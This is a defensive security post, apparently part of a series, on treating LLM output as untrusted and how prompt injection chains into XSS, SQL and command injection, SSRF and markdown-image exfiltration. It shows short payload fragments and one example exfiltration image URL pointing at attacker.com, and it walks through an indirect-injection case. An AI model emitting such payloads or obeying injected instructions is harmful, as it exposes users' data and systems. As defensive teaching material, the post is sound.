# Treating Model Output as Untrusted

*Injection defense usually focuses on what goes into the model. But an equally dangerous class of bug lives on the way out: whatever the model produces gets passed to another system — a browser, a shell, a database, another service — that trusts it. If the model can be made to emit a malicious payload, and your code renders or executes it, the injection escapes the model and lands in your infrastructure.*

Posts 1–5 hardened the input side and the model's privileges. This post turns to the output. The principle is a direct consequence of everything so far: if the model's behavior can be influenced by untrusted input (and it can), then the model's *output* is itself potentially untrusted — and must be treated as such before any downstream system consumes it. OWASP calls the failure to do this "insecure output handling," and it's how prompt injection turns into classic web vulnerabilities.

## Output is an attack vector, not just an answer

The mental error is thinking of model output as "the answer" — a benign string to display. In an LLM-integrated application, the output is frequently *fed into another system that acts on it*: rendered as HTML, inserted into SQL, passed to a shell, used as a URL, written to a file, sent as a tool call. Every one of those consumers has its own injection vulnerabilities, and the model's output is now untrusted input to them.

Chain this with prompt injection and the danger is clear. An attacker uses injection (direct or indirect) to control what the model *emits*, then relies on your code to *pass that output somewhere dangerous*. The model becomes a delivery vehicle for a payload aimed not at the model, but at your browser, your database, or your server.

## The concrete failure modes

The same output-handling bugs that plague all software, now reachable through the model:

- **XSS (cross-site scripting).** If model output is rendered as HTML without escaping, an attacker who controls the output (via injection) can emit `<script>` or `<img onerror=...>` and run code in your users' browsers. This is extremely common in chat UIs that render model responses as rich HTML/markdown. *Defense: escape/​sanitize model output before rendering, exactly as you would any user-generated content; use a strict sanitizer for any HTML you do allow.*
- **SQL injection.** If the model produces a value (or worse, a whole query) that your code interpolates into SQL, injected output can manipulate or destroy data. *Defense: never build SQL by string-concatenating model output; use parameterized queries, and if the model emits query fragments, validate against an allowlist.*
- **Command injection.** If model output reaches a shell (`os.system`, `exec`), an attacker can emit shell metacharacters and run arbitrary commands. *Defense: never pass model output to a shell; if you must run commands, use argument arrays (no shell interpretation) and strict allowlists.*
- **SSRF and dangerous URLs.** If the model emits a URL your backend then fetches, injection can point it at internal services (`http://169.254.169.254/...` for cloud metadata, internal admin endpoints). *Defense: validate and allowlist any URL the model produces before fetching it.*
- **Unsafe markdown.** Even "just markdown" can carry `javascript:` links, auto-loading images that leak data via the request (a classic exfiltration channel — the model is tricked into encoding stolen data into an image URL that the victim's client fetches), and misleading link text. *Defense: sanitize rendered markdown; block `javascript:` and data URLs; be cautious with auto-loaded remote images.*

The image-exfiltration case deserves emphasis because it's subtle and combines the whole series: indirect injection makes the model embed `![](https://attacker.com/log?data=<secrets>)` in its markdown reply, the client auto-loads the image, and the secrets are exfiltrated — no tool call, no obvious action, just a rendered image. It's defeated entirely by sanitizing output and controlling which remote resources the client will fetch.

## The rule: escape at the boundary, always

The defense is the same discipline that has protected software for decades, applied to a new source of untrusted data: **treat model output as untrusted, and encode/validate it for the specific context that consumes it, at that boundary.**

- Going to **HTML** → HTML-escape (and sanitize any allowed markup).
- Going to **SQL** → parameterize.
- Going to a **shell** → don't; if unavoidable, argument arrays + allowlist.
- Going to a **URL fetch** → validate against an allowlist.
- Going to **another tool/API** → validate the structure and values before the call.

This is *context-specific output encoding* — the well-understood fix for injection in general — and it works here precisely because it doesn't depend on trusting the model. It assumes the output could be hostile and neutralizes it for wherever it's going.

## Structured output as a containment tool

A powerful way to make output safe is to constrain its *shape*. Instead of accepting free-form text and hoping it's benign, require the model to produce **structured, schema-validated output** (JSON matching a strict schema, an enum choice, a typed object). Then your code validates it against the schema before using it, and only ever consumes the validated fields.

This helps in two ways. It shrinks the attack surface — a model constrained to emit `{"action": "lookup", "order_id": 12345}` has far less room to smuggle a payload than one emitting free prose. And it forces a validation step — you're parsing and checking the output against expectations, so malformed or malicious structures are rejected before they reach a consumer. Structured output doesn't make injection impossible (an attacker might still influence field *values*), but combined with validating those values, it turns the output boundary from an open pipe into a checked gate.

## Closing the loop

Output handling completes the containment strategy. Least privilege (post 5) limits what the model can *do* directly through tools; output handling limits what the model can do *indirectly* by feeding a payload to a downstream system that trusts it. Skip it, and you can have a perfectly privilege-scoped model that still enables XSS in your own UI or exfiltrates data through a rendered image — the model didn't take a dangerous action, your rendering code did.

The unifying idea across the whole defensive stack is now visible: **trust nothing that the model touched.** Its input can be poisoned, so its behavior can be steered, so its output can be weaponized. Escape it, validate it, structure it, and constrain what it can reach — at every boundary — and the model can be fooled all day without a single fooling turning into harm.

## Key takeaways

- Model output is **not just "the answer"** — it's frequently fed to systems that act on it (browser, SQL, shell, URL fetch, other tools), so it must be treated as **untrusted input** to each of those (OWASP "insecure output handling").
- Prompt injection **chains into classic vulnerabilities**: the attacker steers what the model *emits*, then your code passes it somewhere dangerous — enabling **XSS** (unescaped HTML), **SQL/command injection** (interpolated output), **SSRF** (model-emitted URLs), and **markdown exfiltration** (auto-loaded image URLs encoding stolen data).
- The fix is decades-old discipline applied to a new source: **context-specific output encoding at the boundary** — HTML-escape for HTML, parameterize for SQL, argument-arrays+allowlist for shells, allowlist model-emitted URLs, validate before any tool call. It works because it doesn't depend on trusting the model.
- **Structured, schema-validated output** contains the output boundary — a model constrained to a strict JSON schema has less room to smuggle payloads, and forces a validation step that rejects malicious structures.
- Output handling completes containment: least privilege limits *direct* action, output handling limits *indirect* harm via trusting downstream systems — the unifying rule is **trust nothing the model touched**: escape it, validate it, structure it, constrain it, at every boundary.

## Further reading

- [OWASP Top 10 for LLM Applications (insecure output handling)](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Simon Willison — Prompt injection: what's the worst that can happen?](https://simonwillison.net/2023/Apr/14/worst-that-can-happen/)
